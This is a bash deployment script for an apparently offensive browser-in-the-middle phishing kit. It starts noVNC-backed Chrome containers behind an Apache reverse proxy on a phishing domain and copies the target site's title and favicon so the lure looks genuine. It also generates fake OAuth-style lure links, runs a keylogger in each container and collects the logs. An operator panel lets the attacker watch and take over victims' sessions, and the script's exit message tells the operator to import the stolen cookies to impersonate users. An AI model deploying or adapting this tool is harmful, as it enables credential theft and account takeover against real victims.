#!/bin/bash

#
# [ Globals ]
#

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'
PROFILE_COPY_INTERVAL=5
APACHEFILE="./proxy/000-default.conf"

# [ Cool banner ]
cat << EOF
                          __    __       __    
 .--.--.-----.-----.-----|  |--|__.-----|  |--.
 |  |  |  -__|__ --|  _  |     |  |__ --|     |
 |___  |_____|_____|   __|__|__|__|_____|__|__|
 |_____|           |__|                        

EOF
echo -e "${BLUE}patchright-chrome branch${NC}"
echo ""

#
# [ Argument Parsing ]
#

helpFunction() {
    echo ""
    echo "Usage: $0 -u No. Users -d Domain -t Target"
    echo -e "\t -u Number of users - please note for every user a container is spawned so don't go crazy"
    echo -e "\t -d Domain which is used for phishing"
    echo -e "\t -t Target website which should be displayed for the user"
    echo -e "\t -s true / false if ssl is required - if ssl is set pem and key file are needed"
    echo -e "\t -c Full path to the pem file of the ssl certificate"
    echo -e "\t -k Full path to the key file of the ssl certificate"
    echo -e "\t -a Adjust default user agent string"  
    echo -e "\t -r true / false to turn on the redirection to the target page"
    echo -e "\t -x true / false to turn on the remote debugging port in all browsers"
    echo -e "\t -l Preferred language codes for the browser (such as en,es,pt,pt-BR)"
    echo -e "\t -m Enable mobile mode (spawns 2 containers for each user)"
    exit 1 # Exit script after printing help
}

checkPrereqs() {
    error_found=0

    if ! command -v docker &>/dev/null; then
        echo "${RED}[-] Error: Docker is not installed.${NC}"
        error_found=1
    fi

    if [ "$error_found" -ne 0 ]; then
        echo -e "${RED}[-] One or more required tools are missing. Exiting.${NC}"
        exit 1
    fi
}

while getopts "u:d:t:s:c:k:a:p:r:x:l:m:" opt
do
    case "$opt" in
        u ) User="$OPTARG" ;;
        d ) Domain="$OPTARG" ;;
        t ) Target="$OPTARG" ;;
        s ) SSL="$OPTARG" ;;
        c ) cert="$OPTARG" ;;
        k ) key="$OPTARG" ;;
        a ) useragent=$OPTARG ;;
        p ) param=$OPTARG ;;
        r ) Redirect=$OPTARG ;;
        x ) DebugPort=$OPTARG ;;
        l ) AcceptLang=$OPTARG ;;
        m ) EnableMobile=$OPTARG ;;
        ? ) helpFunction ;; # Print helpFunction in case parameter is non-existent
    esac
done

checkPrereqs

# Begin script in case all parameters are correct and the prerequisites are present

# Loop for every user a docker container need to be started 
 
# Write of default config for apache

#
# [ Modules ]
#

declare -A builds=(
    ["vnc-docker"]="VNC-Dockerfile"
    ["mvnc-docker"]="MVNC-Dockerfile"
    ["rev-proxy"]="PROXY-Dockerfile"
)

build_docker_images() {
    for tag in "${!builds[@]}"; do
        dockerfile=${builds[$tag]}
        echo -e "${YELLOW}[~] Building image '${tag}' from '${dockerfile}'...${NC}"
        
        if sudo docker build -t "$tag" -f "./$dockerfile" ./; then
            echo -e "${GREEN}[+] Successfully built '${tag}' image.${NC}"
        else
            echo -e "${RED}[-] Failed to build '${tag}' from '${dockerfile}'.${NC}" >&2
            return 1
        fi
    done
}

clean_docker_images() {
    echo -e "${YELLOW}[~] Stopping and removing VNC and reverse proxy containers...${NC}"

    vnc_containers=$(sudo docker ps --filter=name="vnc-*" -q)
    proxy_containers=$(sudo docker ps --filter=name="rev-proxy" -q)

    if [[ -n "$vnc_containers" ]]; then
        if sudo docker rm -f $vnc_containers; then
            echo -e "${GREEN}[+] Removed vnc-* containers.${NC}"
        else
            echo -e "${RED}[-] Failed to remove vnc-* containers.${NC}" >&2
            return 1
        fi
    fi

    if [[ -n "$proxy_containers" ]]; then
        if sudo docker rm -f $proxy_containers; then
            echo -e "${GREEN}[-] Removed rev-proxy container(s).${NC}"
        else
            echo -e "${RED}[-] Failed to remove rev-proxy container(s).${NC}" >&2
            return 1
        fi
    fi

    while true; do
        read -p "$(echo -e "Do you want to perform a full cleanup? [y/n] ")" yn
        case $yn in
            [Yy]* )
                echo -e "${YELLOW}[~] Removing related Docker images...${NC}"
                for img in "${!builds[@]}"; do
                    img_ids=$(sudo docker images --filter=reference="$img" -q)
                    if [[ -n "$img_ids" ]]; then
                        if sudo docker rmi -f $img_ids; then
                            echo -e "${GREEN}[+] Removed image: $img${NC}"
                        else
                            echo -e "${RED}[-] Failed to remove image: $img${NC}" >&2
                            return 1
                        fi
                    fi
                done
                break;;
            [Nn]* )
                echo -e "${YELLOW}[~] Skipping image removal.${NC}"
                break;;
            * )
                echo -e "${RED}[-] Please answer y or n.${NC}";;
        esac
    done
}

copy_profile() {
    # User ID
    local x=$1
    shift

    local mobile=$2
    shift

    # URLs
    local urls=("$@")

    pushd ./output &> /dev/null

    if [ $mobile = "true" ]; then
        DATA_CONT=mvnc-user$x
        NAME_USER=muser$x
    else
        DATA_CONT=vnc-user$x
        NAME_USER=user$x
    fi

    # Copy browser data into a central folder
    # and copy keylogger results to host
    sudo docker exec $DATA_CONT test -e /home/headless/Keylog.txt && sudo docker cp $DATA_CONT:/home/headless/Keylog.txt ./$NAME_USER-keylog.txt
    #sleep 2

    popd &> /dev/null
}

#
# [ Main logic ]
#

case "$1" in 

"install")
    build_docker_images
    ;;
"cleanup")
    clean_docker_images
    ;;
*)
    
    # Print helpFunction in case parameters are empty
    if [ -z "$User" ] || [ -z "$Domain" ] || [ -z "$Target" ]; then
        echo "Some or all of the parameters are empty";
        helpFunction
    fi
    
    if [ -n "$SSL" ]; then
        if [ -z "$cert" ] || [ -z "$key" ]; then
            echo "Some or all of the parameters are empty";
            helpFunction
        elif [ ! -f "$cert" ] || [ ! -f "$key" ]; then 
            echo "Certificate and / or Key file could not be found."
            exit 1
        fi
    fi

    START=1

    if [ "$EnableMobile" = "true" ]; then
        END=$((User * 2))
    else
        END=$User
    fi
    
    temptitle=$(curl $Target -sL -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' | grep -oP '(?<=title).*(?<=title>)' | grep -oP '(?=>).*(?=<)') 
    pagetitle="${temptitle:1}"
    
    # Fetch the favicon for the target page
    curl https://www.google.com/s2/favicons?domain=$Target -sL --output novnc.ico
    icopath="./novnc.ico"
    
    if [ -n "$SSL" ]; then
        schema=https
        proxyport=443
    else
        schema=http
        proxyport=80
    fi

    echo -e "${YELLOW}[~] Generating configuration file${NC}" 

    echo 'NameVirtualHost *
             Header unset ETag
             Header set Cache-Control "max-age=0, no-cache, no-store, must-revalidate"
             Header set Pragma "no-cache"
             Header set Expires "Wed, 12 Jan 1980 05:00:00 GMT"
         ' > $APACHEFILE
    
    echo "<VirtualHost *:$proxyport>" >> $APACHEFILE

    # Set up SSL cert / key
    if [ -n "$SSL" ]; then
        echo "
        SSLEngine on
        SSLProxyEngine on
        SSLCertificateFile /etc/ssl/certs/server.pem
        SSLCertificateKeyFile /etc/ssl/private/server.key
        " >> $APACHEFILE
    fi

    echo '
    RewriteEngine On
    RewriteMap redirects txt:/tmp/redirects.txt
    RewriteCond ${redirects:%{REQUEST_URI}} ^(.+)$
    RewriteRule ^(.*)$ ${redirects:$1} [R,L]
    
    <Location /status.php>
        Deny from all
    </Location>
    ' >> $APACHEFILE
     
    echo -e "${GREEN}[+] Configuration file generated${NC}" 
    
    htmlpath="./output/status.php"
    if [ -e $htmlpath ]; then
        rm -rf $htmlpath
    fi
    
    cat templates/status.header.php > ./output/status.php

    CHROME_PATH_DESKTOP='/opt/google/chrome/chrome'
    CHROME_PATH_MOBILE='/opt/google/chrome/chrome'

    # Start with a basic template for user preferences, then
    # fill them with needed values for each case
    # and upload to each container
    if [ -n "$AcceptLang" ]; then
        CHROME_PATH_DESKTOP=$CHROME_PATH_DESKTOP" --lang="$AcceptLang
        CHROME_PATH_MOBILE=$CHROME_PATH_MOBILE" --lang="$AcceptLang
    fi

    if [ -n "$useragent" ]; then
        # Custom UA, mobile (don't override)
        CHROME_PATH_MOBILE=$CHROME_PATH_MOBILE' --user-agent="Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/136.0.7103.91 Mobile/15E148 Safari/604.1"'

        # Custom UA, desktop (override)
        CHROME_PATH_DESKTOP=$CHROME_PATH_DESKTOP' --user-agent="'$useragent'"'
    else
        # No custom UA, mobile
        CHROME_PATH_MOBILE=$CHROME_PATH_MOBILE' --user-agent="Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/136.0.7103.91 Mobile/15E148 Safari/604.1"'

        # No custom UA, desktop
        CHROME_PATH_DESKTOP=$CHROME_PATH_DESKTOP' --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"'
    fi

    mobile=false

    declare -a urls=()

    echo -e "${YELLOW}[-] Starting containers${NC}"  
    for (( c=$START; c<=$END; c++ )); do
        if [ "$mobile" = "true" ]; then
            VNC_IMG=mvnc-docker;
            VNC_CONT=mvnc-user$c;
            PREF_FILE='./vnc/muser.js';
            CHROME_PATH="$CHROME_PATH_MOBILE"
        else
            VNC_IMG=vnc-docker;
            VNC_CONT=vnc-user$c;
            PREF_FILE='./vnc/user.js';
            CHROME_PATH="$CHROME_PATH_DESKTOP"
        fi

        echo -e "${BLUE}———— ${VNC_CONT} (from image ${VNC_IMG}) [$c/$END] ————${NC}";

        PW=$(openssl rand -hex 14)
        AdminPW=$(tr -dc 'A-Za-z0-9!' < /dev/urandom | head -c 32)
        Token=$(cat /proc/sys/kernel/random/uuid)

        # Start up the corresponding VNC container
        # and then Chrome a single time (just to set up the profile?)
        echo -e "${YELLOW}[+] Starting VNC container${NC}"
        if [ "$DebugPort" = "true" ]; then
            DEBUGPORT_HOST=9$(printf "%03d" $c)
            sudo docker run -dit -p $DEBUGPORT_HOST:9223 --name $VNC_CONT -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 $VNC_IMG  &> /dev/null 

            # Socat is needed since the remote debugging port listens on localhost in the container
            sudo docker exec -dit $VNC_CONT sh -c 'socat TCP-LISTEN:9223,fork TCP:127.0.0.1:9222'

            echo -e "${GREEN}[+] RemoteDebuggingPort: $DEBUGPORT_HOST${NC}"
        else
            sudo docker run -dit --name $VNC_CONT -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 $VNC_IMG  &> /dev/null 
        fi
        echo -e "${GREEN}[+] VNC container started${NC}"

        echo -e "${YELLOW}[+] Setting up chrome profile...${NC}"

        sleep 3
        sudo docker exec $VNC_CONT sh -c "$CHROME_PATH &" &> /dev/null
        sleep 1
        sudo docker exec $VNC_CONT sh -c "pidof chrome | xargs kill &" &> /dev/null
        sleep 2

        sudo docker cp $PREF_FILE $VNC_CONT:/home/headless/user.js

        #sleep 1;

        sudo docker exec $VNC_CONT sh -c "find -name cookies.sqlite -exec dirname {} \; | xargs -I {} cp -f -r /home/headless/user.js {}"

        echo -e "${GREEN}[+] Profile setup completed.${NC}"

        sleep 1
        
        if [ -n "$pagetitle" ]; then
            sudo docker exec --user root $VNC_CONT sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/conn.html"
            sudo docker exec --user root $VNC_CONT sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/app/ui.js"
            if [ "$mobile" = "true" ]; then
                sudo docker exec --user root $VNC_CONT sh -c "sed -i 's/min-width: 8em;/\/\*min-width: 8em;\*\//' /usr/libexec/noVNCdim/app/styles/input.css"
            fi
        fi
        
        if [ -e $icopath ]; then
            sudo docker cp ./novnc.ico $VNC_CONT:/usr/libexec/noVNCdim/app/images/icons/novnc.ico
        fi

        # Replace TARGET_URL placeholder with actual target inside vnc/ui.js
        if [ -n "$Redirect" ]; then
            RedirectTarget=$Target
            sudo docker exec --user root $VNC_CONT sh -c "sed -i 's/TARGET_URL/${Target//\//\\/}/g' /usr/libexec/noVNCdim/app/ui.js"
        else
            RedirectTarget="/"
            sudo docker exec --user root $VNC_CONT sh -c "sed -i 's/TARGET_URL/'$schema':\/\/$Domain/g' /usr/libexec/noVNCdim/app/ui.js"
        fi
        
        # Important sleep!
        sleep 6;

        # Keylogger
        echo -e "${YELLOW}[~] Starting keylogger...${NC}"
        sudo docker exec -dit $VNC_CONT sh -c "python3 /home/headless/logger.py" 
        echo -e "${GREEN}[+] Keylogger started${NC}"
        
        if [ "$DebugPort" = "true" ]; then
            CHROME_SPAWN_CMD="xrandr --output VNC-0 & env DISPLAY=:1 $CHROME_PATH $Target --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-debug --disable-fre --no-default-browser-check --no-first-run --kiosk &"
        else
            CHROME_SPAWN_CMD="xrandr --output VNC-0 & env DISPLAY=:1 $CHROME_PATH $Target --disable-fre --no-default-browser-check --no-first-run --kiosk &"
        fi

        if [ "$mobile" = "true" ]; then
            sudo docker exec $VNC_CONT sh -c "nohup unclutter -idle 0 > /dev/null 2>&1 &"
        else
            sudo docker exec $VNC_CONT sh -c "xfconf-query --channel xsettings --property /Gtk/CursorThemeName --set WinCursor &" 
        fi     

        echo -e "${YELLOW}[~] Starting browser...${NC}"
        sudo docker exec $VNC_CONT sh -c "$CHROME_SPAWN_CMD" &> /dev/null    
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[+] Browser started:${NC}\n$CHROME_SPAWN_CMD"
        else
            echo -e "${RED}[+] Error starting the browser${NC}"
        fi

        CIP=$(sudo docker container inspect $VNC_CONT | grep -m 1 -oP '"IPAddress":\s*"\K[^"]+')

        if [ "$mobile" = "true" ]; then
            filename="miframe$((c - 1)).html"
        else
            filename="iframe$c.html"
        fi
        
        awk '{
            gsub("%schema%", "'$schema'");
            gsub("%PW%", "'$PW'");
            gsub("%domain%", "'$Domain'");
            gsub("%pagetitle%", "'"$pagetitle"'");
            print
        }' templates/proxy.html > ./proxy/$filename

        if [ "$mobile" = "false" ]; then
        echo "
    RewriteCond %{REQUEST_URI} /v$c
    RewriteCond %{HTTP_USER_AGENT} \"iPhone|Android|iPad\"
    RewriteRule ^/(.*) /miframe$c.html [P,L]
            
    RewriteCond %{REQUEST_URI} /v$c
    RewriteCond %{HTTP_USER_AGENT} !(iPhone|Android|iPad)
    RewriteRule ^/(.*) /iframe$c.html [P]
        " >> $APACHEFILE
        fi

        echo "
            
    <Location /$PW>
        ProxyPass http://$CIP:6901
        ProxyPassReverse http://$CIP:6901
    </Location>
    <Location /$PW/websockify>
        ProxyPass ws://$CIP:6901/websockify keepalive=On
        ProxyPassReverse ws://$CIP:6901/websockify
    </Location>
    ProxyTimeout 600
    Timeout 600
    " >> $APACHEFILE
        
        if [ -n "$SSL" ]; then
            echo "
            <div class='iframe-wrapper'>
              <iframe class='custom-iframe' src='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' sandbox='allow-same-origin allow-scripts'></iframe>
              <!-- Form for file creation -->
              <form method='post'>
            <!-- Buttons inside the wrapper -->
            <div class='iframe-buttons'>
              <a class='iframe-button' href='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' target='_blank' > View </a>
              <input type='hidden' name='file_content' value='/$PW/websockify $RedirectTarget'>
              <input type='hidden' name='file_content2' value='/$PW/conn.html $RedirectTarget'>
              <input type='hidden' name='ip_value' value='$CIP'>
              <button type='submit' name='create_file' class='iframe-button'>Disconnect</button>
              <a class='iframe-button' href='https://$Domain:65534/angler/$PW/conn.html?path=/angler/$PW/websockify&password=$PW&autoconnect=true&resize=remote' target='_blank'>Connect</a>
            </div>
              </form>
            </div>" >> ./output/status.php
        else
            echo "
            <div class='iframe-wrapper'>
              <iframe class='custom-iframe' src='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' sandbox='allow-same-origin allow-scripts'></iframe>
              <!-- Form for file creation -->
              <form method='post'>
            <!-- Buttons inside the wrapper -->
            <div class='iframe-buttons'>
              <a class='iframe-button' href='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' target='_blank' > View </a>
              <input type='hidden' name='file_content' value='/$PW/websockify $RedirectTarget'>
              <input type='hidden' name='file_content2' value='/$PW/conn.html $RedirectTarget'>
              <input type='hidden' name='ip_value' value='$CIP'>
              <button type='submit' name='create_file' class='iframe-button'>Disconnect</button>
              <a class='iframe-button' href='http://$Domain:65534/angler/$PW/conn.html?path=/angler/$PW/websockify&password=$PW&autoconnect=true&resize=remote' target='_blank'>Connect</a>
            </div>
              </form>
            </div>" >> ./output/status.php
        fi

        if [ "$mobile" = "false" ]; then
            if [ -n "$param" ]; then
                urls+=("$schema://$Domain/v$c/$param")
            else
                urls+=("$schema://$Domain/v$c/oauth2/authorize?access-token=$Token")
            fi
        fi
    
        if [ "$EnableMobile" = "true" ]; then
            # Only toggle mobile flag between iterations if
            # EnableMobile is set to true
            if [ "$mobile" = "true" ]; then
                mobile=false
            else
                mobile=true
            fi 
        fi
    done

    echo "
        </div>
    </body>
    </html>
        " >> ./output/status.php
    echo "</VirtualHost>" >> $APACHEFILE

    awk '/<VirtualHost/,/<\/VirtualHost/ {gsub(":'$proxyport'", ":65534");gsub("Location /","Location /angler/");print; if (/<\/VirtualHost/) print ""}' "$APACHEFILE" > temp.txt
    awk '/<VirtualHost/,/<\/VirtualHost/ {gsub("Location /angler/status.php","Location /");gsub("Deny from all","AuthType Basic \n        AuthName \"Restricted Area\" \n        AuthUserFile /etc/apache2/.htpasswd \n        Require valid-user");print; if (/<\/VirtualHost/) print ""}' "temp.txt" > temp2.txt
   
    cat temp2.txt >> $APACHEFILE
    
    rm -f ./temp.txt ./temp2.txt

    echo -e "${BLUE}————————————————————————————————————————————————${NC}"
    echo -e "${GREEN}[+] All VNC containers started${NC}"
    echo -e "${YELLOW}[~] Starting reverse proxy${NC}"  

    # Start of rev proxy
    sudo docker run -dit -p$proxyport:$proxyport -p65534:65534 --name rev-proxy rev-proxy /bin/bash &> /dev/null
    
    sleep 5

    if [ -n "$SSL" ]; then
        sudo docker cp $cert rev-proxy:/etc/ssl/certs/server.pem
        sudo docker cp $key rev-proxy:/etc/ssl/private/server.key
    fi
    
    sudo docker exec rev-proxy /bin/bash -c 'echo "Listen 65534" >> /etc/apache2/ports.conf' 
    sudo docker exec -it rev-proxy /bin/bash -c "htpasswd -cb /etc/apache2/.htpasswd angler $AdminPW"
    sudo docker cp $APACHEFILE rev-proxy:/etc/apache2/sites-enabled/   &> /dev/null
    sudo docker cp ./novnc.ico rev-proxy:/var/www/html/favicon.ico
    for (( d=$START; d<=$User; d++ )); do
        sudo docker cp ./proxy/iframe$d.html rev-proxy:/var/www/html/
        if [ "$EnableMobile" = "true" ]; then
            sudo docker cp ./proxy/miframe$d.html rev-proxy:/var/www/html/
        fi
    done
    sudo docker exec rev-proxy sed -i 's/MaxKeepAliveRequests 100/MaxKeepAliveRequests 0/' '/etc/apache2/apache2.conf'
    
    sudo docker exec rev-proxy /bin/bash service apache2 restart &> /dev/null
    sudo docker exec rev-proxy /bin/bash -c "cron"
    sleep 3
    sudo docker exec rev-proxy /bin/bash -c "crontab"
    sudo docker cp ./output/status.php rev-proxy:/var/www/html/

    rm -f ./novnc.ico

    echo -e "${GREEN}[+] Reverse proxy started${NC}"

    echo -n "[+] Admin interface available under: "
    if [ -n "$SSL" ]; then
        echo -e "${BLUE}https://$Domain:65534/status.php${NC}"
    else
        echo -e "${BLUE}http://$Domain:65534/status.php${NC}"
    fi
        
    echo -e "    +----------------------------------------------+"
    echo -e "    | Username | ${BLUE}angler${NC}                           |"
    echo -e "    | Password | ${BLUE}$AdminPW${NC} |"
    echo -e "    +----------------------------------------------+"
    echo -e "${GREEN}[+] Setup completed${NC}"
    echo -e "[+] Use the following URLs:"
    for value in "${urls[@]}"; do
        echo -e "    ${BLUE}$value${NC}"
    done
    
    dbpath="./output/phis.db"
    if [ -e $dbpath ]; then
        rm -f $dbpath
        echo -e "${GREEN}[+] Cleared existing ./output/phis.db...${NC}"
    fi
    
    echo -e "[~] Use the provided patchright scripts to dump cookies${NC}" 
    echo -e "    You can check and view the open session by use of the status.php in the output directory${NC}" 

    trap 'echo -e "\n[~] Import stealed session and cookie JSON to impersonate user"; echo -e "[~] VNC and Rev-Proxy container will be removed" ; sleep 2 ; sudo docker rm -f $(sudo docker ps --filter=name="vnc-*" -q) &> /dev/null && sudo docker rm -f $(sudo docker ps --filter=name="rev-proxy" -q) &> /dev/null & printf "[+] Done!"; sleep 2' SIGTERM EXIT

    sleep $PROFILE_COPY_INTERVAL

    > logs/copy_profile.log

    while :; do
        mobile=false
        for (( c=$START; c<=$END; c++ )); do
            copy_profile $c $mobile $urls >> logs/copy_profile.log 2>&1
            if [ "$EnableMobile" = "true" ]; then
                if [ "$mobile" = "true" ]; then
                    mobile="false"
                else
                    mobile="true"
                fi
            fi
        done

        sleep $PROFILE_COPY_INTERVAL
    done

    ;;
esac
